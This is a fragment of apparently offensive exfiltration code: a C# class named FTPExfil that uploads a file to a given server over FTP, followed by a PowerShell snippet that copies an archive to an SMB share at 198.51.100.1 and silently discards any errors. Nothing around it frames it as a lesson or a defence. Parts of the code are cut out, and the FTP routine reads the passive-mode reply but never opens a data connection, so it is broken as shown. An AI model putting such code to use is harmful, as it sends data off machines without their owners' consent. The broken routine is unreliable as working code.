...
public class FTPExfil {
    public static string Upload(string server, int port, string file) {
        try {
            ...
            writer.WriteLine("PASV"); writer.Flush();
            string pasv = reader.ReadLine();
            writer.WriteLine("STOR " + Path.GetFileName(file)); writer.Flush();
            reader.ReadLine();
            writer.WriteLine("QUIT"); writer.Flush();
            tcp.Close();
            return "FTP session completed";
...
try {
    $smb = "\\198.51.100.1\share\$(Split-Path $archive -Leaf)"
    Copy-Item $archive $smb -Force -ErrorAction Stop
} catch {}
